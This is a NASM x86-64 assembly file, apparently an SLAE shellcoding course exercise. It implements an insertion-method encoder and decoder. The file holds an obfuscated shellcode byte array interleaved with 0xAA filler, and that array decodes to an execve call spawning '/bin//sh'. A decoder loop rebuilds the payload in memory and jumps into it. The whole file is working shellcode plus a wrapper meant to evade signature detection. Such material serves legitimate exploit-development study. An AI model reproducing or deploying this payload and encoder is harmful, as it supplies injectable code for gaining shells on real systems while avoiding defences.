; File: insertion-decoder.nasm
; Author: Kevin Ren, originally professor Viviek from SLAE
; Purpose: to demostrate a custom encoder and decoder using the insertion method to execute encoded shellcode from machine code
; editted for 64 bit mode, uses rdi, rsi, rax, rbx instead of edi, esi, eax, ebx, also uses rip rel address

global _start

section .text
_start: 
	jmp short decoder
	shellcode: db 0x48,0xaa,0x31,0xaa,0xc0,0xaa,0x48,0xaa,0x31,0xaa,0xdb,0xaa,0xb0,0xaa,0x3b,0xaa,0x53,0xaa,0x48,0xaa,0xb9,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x2f,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa,0x51,0xaa,0x48,0xaa,0x89,0xaa,0xe7,0xaa,0x53,0xaa,0x57,0xaa,0x48,0xaa,0x89,0xaa,0xe6,0xaa,0x53,0xaa,0x48,0xaa,0x89,0xaa,0xe2,0xaa,0x0f,0xaa,0x05,0xaa,0xbb,0xbb 

decoder:
	lea rsi, [rel shellcode]	; address of shellcode now in rsi using relative rip addressing

	lea rdi, [rsi + 1]		; initiate the first counter of each byte after the first, to be replaced with correct byte
	xor rax, rax			; zeroing out rax
	mov al, 0x1			; intiate the second counter of each even byte starting from the second byte

	xor rbx, rbx			; zeroing out rbx so it can be used as a working register to move data

decode:
	mov bl, byte [rsi + rax]	; moving the 0xaa byte into rbx
	xor bl, 0xAA			; condition checker, anything other than 0xaa will result in a result other than 0
	jnz short shellcode		; if condition is met, aka at the end of decode, transfer control to decoded shellcode
	mov bl, byte [rsi + rax + 1]	; moving the very next byte after 0xaa to bl register
	mov byte [rdi], bl		; moving what we transfered with bl into one byte of rdi register, 
					; which contains address of shellcode, and a counter to the corrected/decoded bytes
					; which counts for every byte after the first
	inc rdi				; make sure this counter is incremented so the correct byte gets replaced
	add rax, 2			; increment counter for 0xaa, so can offset from the original rsi address
	jmp decode			; loop
	

